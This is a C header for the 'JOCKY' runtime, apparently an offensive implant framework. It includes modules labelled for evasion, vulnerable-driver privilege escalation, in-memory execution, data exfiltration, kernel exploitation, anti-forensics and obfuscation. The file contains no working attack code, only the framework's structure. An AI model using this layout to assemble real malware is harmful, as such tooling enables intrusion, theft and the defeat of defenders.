/**
 * JOCKY Runtime API - Complete Header
 *
 * Include this file to access all JOCKY runtime functions.
 */

#ifndef JOCKY_RUNTIME_H
#define JOCKY_RUNTIME_H

/* Core runtime initialization */
#include "../init/init.h"

/* Anti-analysis and evasion */
#include "../evasion/evasion.h"

/* Driver-based privilege escalation (Windows) */
#include "../byovd/byovd.h"

/* In-memory code execution */
#include "../execution/execution.h"

/* Data exfiltration channels */
#include "../exfil/exfil.h"

/* Kernel exploitation primitives */
#include "../exploitation/exploitation.h"

/* Cleanup and anti-forensics */
#include "../cleanup/cleanup.h"

/* Packing and obfuscation */
#include "../pack/pack.h"

/* Utility functions */
#include "../util/util.h"

/* New Tier 1 APIs */
#include "../io/io.h"                   /* File I/O operations */
#include "../memory/vmem.h"             /* Virtual memory management */
#include "../registry/registry.h"       /* Windows Registry access */

#endif /* JOCKY_RUNTIME_H */
